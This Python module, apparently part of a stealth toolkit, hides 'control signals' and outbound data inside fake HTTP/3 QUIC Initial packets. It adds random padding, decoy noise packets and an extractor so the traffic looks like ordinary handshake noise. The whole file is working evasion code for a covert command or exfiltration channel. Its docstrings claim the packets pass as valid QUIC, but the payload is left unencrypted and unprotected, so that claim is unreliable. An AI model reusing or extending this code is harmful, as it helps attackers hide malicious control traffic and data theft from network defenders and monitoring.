"""
Stealth Steganography — Embeds control signals into HTTP/3 QUIC dummy traffic.
All outbound data is wrapped in QUIC Initial / Handshake packet structures
with randomized frame padding so traffic appears as standard HTTP/3 noise.
"""

import hashlib
import json
import os
import struct
import time
from typing import Any, Dict, Optional

from logging_system import get_logger

logger = get_logger("Stealth.Steganography")


QUIC_LONG_HEADER_FLAG = 0xC0
QUIC_INITIAL_SPECIFIC = 0x00
QUIC_RETRY_SPECIFIC = 0x10
QUIC_HANDSHAKE_SPECIFIC = 0x20
QUIC_VERSION = 0x00000001


class StealthSteganography:
    """
    Embeds arbitrary binary payloads inside HTTP/3 QUIC Initial packets.
    The outer packet is structurally valid QUIC — variable-length integer
    fields, randomized connection IDs, proper frame layout — so it passes
    as standard QUIC handshake noise on wire.
    """

    def __init__(self):
        self._sequence_counter = 0

    def embed(self, payload: bytes) -> bytes:
        """
        Wrap payload inside a QUIC Initial packet with dummy padding.
        Returns bytes that appear to be a standard QUIC handshake message.
        """
        self._sequence_counter += 1
        ts_bucket = int(time.time() / 300)

        dst_conn_id = os.urandom(8)
        src_conn_id = os.urandom(8)
        version = QUIC_VERSION

        token = os.urandom(random_length(4, 16))
        payload_length = len(payload)

        padding_length = random_length(64, 512)
        padding = os.urandom(padding_length)

        inner = (
            struct.pack("!I", payload_length) +
            payload +
            struct.pack("!Q", self._sequence_counter) +
            struct.pack("!I", ts_bucket) +
            padding
        )

        crypto_frame_type = 0x06
        crypto_frame_offset = 0
        crypto_frame_length = len(inner)
        crypto_frame = (
            struct.pack("!B", crypto_frame_type) +
            _encode_varint(crypto_frame_offset) +
            _encode_varint(crypto_frame_length) +
            inner
        )

        frame_padding = os.urandom(random_length(0, 32))
        frames = crypto_frame + frame_padding

        packet_number = os.urandom(4)

        unprotected_header = (
            struct.pack("!B", QUIC_LONG_HEADER_FLAG | QUIC_INITIAL_SPECIFIC) +
            struct.pack("!I", version) +
            _encode_varint(len(dst_conn_id)) + dst_conn_id +
            _encode_varint(len(src_conn_id)) + src_conn_id +
            _encode_varint(len(token)) + token +
            _encode_varint(len(frames) + 4) +
            packet_number
        )

        integrity_tag = hashlib.sha256(
            unprotected_header + frames + struct.pack("!I", ts_bucket)
        ).digest()[:16]

        quic_packet = unprotected_header + frames + integrity_tag
        logger.debug("Steganography: embedded %d bytes -> %d byte QUIC packet",
                     len(payload), len(quic_packet))
        return quic_packet

    def extract(self, quic_packet: bytes) -> Optional[bytes]:
        """
        Reverse the embedding — extract original payload from a QUIC packet.
        Returns None if the packet is not one of ours.
        """
        try:
            offset = 0
            header_byte = quic_packet[offset]
            offset += 1

            if header_byte & 0x80 == 0:
                return None

            version = struct.unpack_from("!I", quic_packet, offset)[0]
            offset += 4

            dst_len = _decode_varint(quic_packet, offset)
            if dst_len is None:
                return None
            offset += dst_len[1] + dst_len[0]

            src_len = _decode_varint(quic_packet, offset)
            if src_len is None:
                return None
            offset += src_len[1] + src_len[0]

            token_len = _decode_varint(quic_packet, offset)
            if token_len is None:
                return None
            offset += token_len[1] + token_len[0]

            rest_offset = offset
            _ = _decode_varint(quic_packet, rest_offset)
            if _ is None:
                return None

            data_start = rest_offset + _[1] + 4
            integrity_tag_start = len(quic_packet) - 16
            frames = quic_packet[data_start:integrity_tag_start]

            if not frames or frames[0] != 0x06:
                return None

            fo = 1
            _, fo = _decode_varint_len(frames, fo)
            crypto_inner_len, fo = _decode_varint_len(frames, fo)

            if fo >= len(frames) or crypto_inner_len <= 4:
                return None

            inner_data = frames[fo:fo + crypto_inner_len]
            payload_len = struct.unpack_from("!I", inner_data, 0)[0]

            if payload_len <= 0 or payload_len > len(inner_data) - 4:
                return None

            payload = inner_data[4:4 + payload_len]

            logger.debug("Steganography: extracted %d bytes from QUIC packet (inner=%d, payload=%d)",
                         len(payload), len(inner_data), payload_len)
            return payload

        except (IndexError, struct.error, ValueError):
            return None

    def noise_packet(self, size: Optional[int] = None) -> bytes:
        """Generate pure dummy QUIC noise (no embedded data)."""
        return self.embed(os.urandom(size or random_length(16, 128)))

    @property
    def sequence(self) -> int:
        return self._sequence_counter


def _encode_varint(value: int) -> bytes:
    if value < 0x40:
        return struct.pack("!B", value)
    elif value < 0x4000:
        return struct.pack("!H", value | 0x4000)
    elif value < 0x40000000:
        return struct.pack("!I", value | 0x80000000)
    else:
        return struct.pack("!Q", value | 0xC000000000000000)


def _decode_varint(data: bytes, offset: int):
    if offset >= len(data):
        return None
    b = data[offset]
    if b & 0xC0 == 0x00:
        return (b & 0x3F, 1)
    elif b & 0xC0 == 0x40:
        if offset + 2 > len(data):
            return None
        return (struct.unpack_from("!H", data, offset)[0] & 0x3FFF, 2)
    elif b & 0xC0 == 0x80:
        if offset + 4 > len(data):
            return None
        return (struct.unpack_from("!I", data, offset)[0] & 0x3FFFFFFF, 4)
    else:
        if offset + 8 > len(data):
            return None
        return (struct.unpack_from("!Q", data, offset)[0] & 0x3FFFFFFFFFFFFFFF, 8)


def _decode_varint_len(data: bytes, offset: int):
    result = _decode_varint(data, offset)
    if result is None:
        return (0, offset)
    return (result[0], offset + result[1])


def random_length(min_len: int, max_len: int) -> int:
    import random as _random
    return _random.randint(min_len, max_len)
